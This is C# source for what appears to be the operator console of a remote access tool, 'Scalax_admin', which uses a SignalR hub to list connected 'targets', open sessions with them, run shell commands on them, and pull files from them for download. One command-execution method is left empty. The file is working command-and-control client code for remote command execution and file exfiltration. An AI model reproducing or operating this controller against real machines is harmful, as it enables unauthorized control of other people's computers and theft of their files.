using Microsoft.AspNetCore.SignalR.Client;


using Scalax_admin.Utils;

namespace Scalax_admin.FUNCS;


public class APP_FUNCS {

    public static void GetAllActiveConnections(HubConnection HC, Action actOf_AskForCmd)
    {
        HC.SendAsync("FetchActiveCons", HC.ConnectionId);
        HC.On("GetActiveCons", (string activeCons) =>
        {
            Console.Write(activeCons.Replace(";", "\n"));
            HC.Remove("GetActiveCons");
        });

        actOf_AskForCmd.Invoke();
    }


    public static void ExecCmdOnOne(HubConnection HC, Action AOAFC, string cmd)
    {
        
    }


    public static void StartSessionWithTarget(HubConnection HC, Action AOAFC, string targetId, out bool IS_SESSION_ACTIVE__var, out string SESSION_ID__var)
    {
        IS_SESSION_ACTIVE__var = true;
        SESSION_ID__var = targetId;
        Console.WriteLine("Started session with the target : " + targetId);
        AOAFC.Invoke();
    }
    public static void EndSessionWithTarget(HubConnection HC, Action AOAFC, string targetId, out bool IS_SESSION_ACTIVE__var, out string SESSION_ID__var)
    {
        IS_SESSION_ACTIVE__var = false;
        Console.WriteLine("Endded session with the target : " + targetId); //@~!~@//
        SESSION_ID__var = "";
        AOAFC.Invoke();
    }

    public static void FireSessionTargetedCmd(HubConnection HC, Action AOAFC, string targetId, string cmd, string CURR_ACTIVE_CMD_DIR, out string CURR_ACTIVE_CMD_DIR__uvar, string cmdDirToNaviagteTo)
    {
        CURR_ACTIVE_CMD_DIR__uvar = cmdDirToNaviagteTo.Contains(@"C:\") ? cmdDirToNaviagteTo : CURR_ACTIVE_CMD_DIR + @"\" + cmdDirToNaviagteTo.Replace(" ", string.Empty);

        HC.SendAsync("ExecCmdOnOne", targetId, cmdDirToNaviagteTo != @"C:\" ? $"cd {cmdDirToNaviagteTo} & {cmd}" : cmd).Wait();
        HC.On("GetExecCmdOnOneRes", (string cmdRes) =>
        {
            Console.Write(cmdRes);
            HC.Remove("GetExecCmdOnOneRes");
        });


        //AOAFC.Invoke();
    }



    public static void PullFile(HubConnection HC, Action AOAFC, string targetId, string fileType, string filePath)
    {
        HC.SendAsync("PullFile", targetId, fileType, filePath, Guid.NewGuid().ToString().Replace("-",string.Empty)).Wait();
        HC.On("GetPulledFileAsDownloadUri", (string fileAddress) =>
        {
            string? fileName = filePath.Split(@"\").LastOrDefault();
            string downloadPath = Path.Combine(Directory.GetCurrentDirectory(), "Downloads", fileName);

            HttpClient_Util.WHC.GetByteArrayAsync(new Uri(fileAddress)).ContinueWith(T =>
            {
                File.WriteAllBytesAsync(downloadPath, T.Result).Wait();
            }).Wait();

            HC.SendAsync("GotPulledFile", true, fileName).Wait();

            HC.Remove("GetPulledFileAsDownloadUri");


            AOAFC.Invoke();
        });

    }


}
